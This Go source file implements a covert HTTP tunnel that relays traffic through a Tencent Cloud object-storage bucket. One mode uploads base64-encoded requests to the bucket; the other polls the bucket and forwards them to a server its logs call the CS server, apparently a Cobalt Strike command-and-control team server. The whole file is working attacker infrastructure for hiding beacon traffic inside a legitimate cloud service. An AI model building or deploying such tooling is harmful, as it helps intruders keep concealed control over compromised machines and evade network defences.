package main

import "C"
import (
	"bytes"
	"context"
	"encoding/base64"
	"flag"
	"github.com/google/uuid"
	"github.com/tencentyun/cos-go-sdk-v5"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var c *cos.Client
var timeout int
var server_address string
var bind_address string

func Get(c *cos.Client, name string) []byte {

	resp, err := c.Object.Get(context.Background(), name, nil)
	if err != nil {
		return nil
	}
	bs, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	//log.Println("[+]", "下载请求包：", string(bs))
	return bs
}

func Send(c *cos.Client, name string, content string) {

	// 1.通过字符串上传对象
	f := strings.NewReader(content)

	_, err := c.Object.Put(context.Background(), name, f, nil)
	if err != nil {
		log.Println("[-]", "上传失败")
		return
	}

}
func Del(c *cos.Client, name string) {

	_, err := c.Object.Delete(context.Background(), name)
	if err != nil {
		panic(err)
	}
}
func process(conn net.Conn) {
	uuid := uuid.New()
	key := uuid.String()
	defer conn.Close() // 关闭连接
	var buffer bytes.Buffer
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	for {
		var buf [1]byte
		n, err := conn.Read(buf[:])
		if err != nil {
			log.Println("[-]", uuid, "read from connect failed, err：", err)
			break
		}
		buffer.Write(buf[:n])
		if strings.Contains(buffer.String(), "\r\n\r\n") {
			//fmt.Println("\n---------DEBUG CLIENT------\n", buffer.String(), "\n----------------------")
			if strings.Contains(buffer.String(), "Content-Length") {

				ContentLength := buffer.String()[strings.Index(buffer.String(), "Content-Length: ")+len("Content-Length: ") : strings.Index(buffer.String(), "Content-Length: ")+strings.Index(buffer.String()[strings.Index(buffer.String(), "Content-Length: "):], "\n")]
				log.Println("[+]", uuid, "数据包长度为：", strings.TrimSpace(ContentLength))
				if strings.TrimSpace(ContentLength) != "0" {
					intContentLength, err := strconv.Atoi(strings.TrimSpace(ContentLength))
					if err != nil {
						log.Println("[-]", uuid, "Content-Length转换失败")
					}

					for i := 1; i <= intContentLength; i++ {
						var b [1]byte
						n, err = conn.Read(b[:])
						if err != nil {
							log.Println("[-]", uuid, "read from connect failed, err", err)
							break
						}
						buffer.Write(b[:n])
					}

				}
			}
			if strings.Contains(buffer.String(), "Transfer-Encoding: chunked") {
				for {
					var b [1]byte
					n, err = conn.Read(b[:])
					if err != nil {
						log.Println("[-]", uuid, "read from connect failed, err", err)
						break
					}
					buffer.Write(b[:n])
					if strings.Contains(buffer.String(), "0\r\n\r\n") {
						break
					}
				}
			}
			log.Println("[+]", uuid, "从客户端接受HTTP头完毕")
			break
		}
	}
	b64 := base64.StdEncoding.EncodeToString(buffer.Bytes())
	Send(c, key+"/client.txt", b64)
	i := 1
	for {
		i++
		time.Sleep(1 * time.Second)
		if i >= timeout {
			log.Println("[x]", "超时，断开")
			Del(c, key+"/client.txt")
			return
		}
		buff := Get(c, key+"/server.txt")
		if buff != nil {
			log.Println("[x]", uuid, "收到服务器消息")
			//fmt.Println(buff)
			Del(c, key+"/server.txt")
			sDec, err := base64.StdEncoding.DecodeString(string(buff))
			//fmt.Println(sDec)
			if err != nil {
				log.Println("[x]", uuid, "Base64解码错误")
				return
			}
			conn.Write(sDec)
			break
		}
	}
	log.Println("[+]", "发送完成")
}
func List(c *cos.Client) []cos.Object {

	opt := &cos.BucketGetOptions{
		Prefix:  "",
		MaxKeys: 3,
	}
	v, _, err := c.Bucket.Get(context.Background(), opt)
	if err != nil {
		return nil
	}
	return v.Contents
	//for _, c := range v.Contents {
	//	fmt.Printf("%s, %d\n", c.Key, c.Size)
	//}
}
func process_server(name string) {

	uuid := name[:strings.Index(name, "/")]
	log.Println("[+]", "发现客户端："+uuid)
	buff := Get(c, name)
	sDec, err := base64.StdEncoding.DecodeString(string(buff))
	Del(c, name)
	conn, err := net.Dial("tcp", server_address)

	if err != nil {
		log.Println("[-]", uuid, "连接CS服务器失败")
		return
	}
	defer conn.Close()
	_, err = conn.Write(sDec)
	if err != nil {
		log.Println("[-]", uuid, "无法向CS服务器发送数据包")
		return
	}
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	var buffer bytes.Buffer
	for {
		var buf [1]byte
		n, err := conn.Read(buf[:])
		if err != nil {
			log.Println("[-]", uuid, "read from connect failed, err", err)
			break
		}
		buffer.Write(buf[:n])

		if strings.Contains(buffer.String(), "\r\n\r\n") {
			//fmt.Println("\n---------DEBUG SERVER------", buffer.String(), "\n----------------------")
			if strings.Contains(buffer.String(), "Content-Length") {

				ContentLength := buffer.String()[strings.Index(buffer.String(), "Content-Length: ")+len("Content-Length: ") : strings.Index(buffer.String(), "Content-Length: ")+strings.Index(buffer.String()[strings.Index(buffer.String(), "Content-Length: "):], "\n")]
				log.Println("[+]", uuid, "数据包长度为：", strings.TrimSpace(ContentLength))
				if strings.TrimSpace(ContentLength) != "0" {
					intContentLength, err := strconv.Atoi(strings.TrimSpace(ContentLength))
					if err != nil {
						log.Println("[-]", uuid, "Content-Length转换失败")
					}

					for i := 1; i <= intContentLength; i++ {
						var b [1]byte
						n, err = conn.Read(b[:])
						if err != nil {
							log.Println("[-]", uuid, "read from connect failed, err", err)
							break
						}
						buffer.Write(b[:n])
					}

				}
			}
			if strings.Contains(buffer.String(), "Transfer-Encoding: chunked") {
				for {
					var b [1]byte
					n, err = conn.Read(b[:])
					if err != nil {
						log.Println("[-]", uuid, "read from connect failed, err", err)
						break
					}
					buffer.Write(b[:n])
					if strings.Contains(buffer.String(), "0\r\n\r\n") {
						break
					}
				}
			}
			log.Println("[+]", uuid, "从CS服务器接受完毕")
			break
		}
	}

	b64 := base64.StdEncoding.EncodeToString(buffer.Bytes())
	Send(c, uuid+"/server.txt", b64)
	log.Println("[+]", uuid, "服务器数据发送完毕")
	return

}
func startClient() {
	log.Println("[+]", "客户端启动成功")

	server, err := net.Listen("tcp", bind_address)
	if err != nil {
		log.Fatalln("[x]", "listen address ["+bind_address+"] faild.")
	}
	for {
		conn, err := server.Accept()
		if err != nil {
			log.Println("Accept() failed, err: ", err)
			continue
		}
		log.Println("[+]", "有客户进入：", conn.RemoteAddr())
		go process(conn)
	}
}
func startServer() {
	log.Println("[+]", "服务端启动成功")
	for {

		time.Sleep(1 * time.Second)
		for _, c2 := range List(c) {
			if strings.Contains(c2.Key, "client.txt") {
				go process_server(c2.Key)
			}
		}
	}
}

var qcloudSecretID = flag.String("id", "", "输入你的腾讯云SecretID")
var qcloudSecretKey = flag.String("key", "", "输入你的腾讯云SecretKey")
var qcloudUrl = flag.String("url", "", "输入你腾讯云OSS桶的url地址")
var mode = flag.String("mode", "", "client/server 二选一")
var address = flag.String("address", "", "监听地址或者目标地址，格式：127.0.0.1:8080")

func main() {
	flag.Parse()
	if *mode == "" || *address == "" || *qcloudUrl == "" {
		flag.PrintDefaults()
		os.Exit(0)
	}
	u, _ := url.Parse(*qcloudUrl)
	b := &cos.BaseURL{BucketURL: u}
	c = cos.NewClient(b, &http.Client{
		Transport: &cos.AuthorizationTransport{
			SecretID:  *qcloudSecretID,  // 替换为用户的 SecretId，请登录访问管理控制台进行查看和管理，https://console.cloud.tencent.com/cam/capi
			SecretKey: *qcloudSecretKey, // 替换为用户的 SecretKey，请登录访问管理控制台进行查看和管理，https://console.cloud.tencent.com/cam/capi
		},
	})
	timeout = 30
	if *mode == "client" {
		bind_address = *address
		startClient()
	} else if *mode == "server" {
		server_address = *address
		startServer()
	}

}
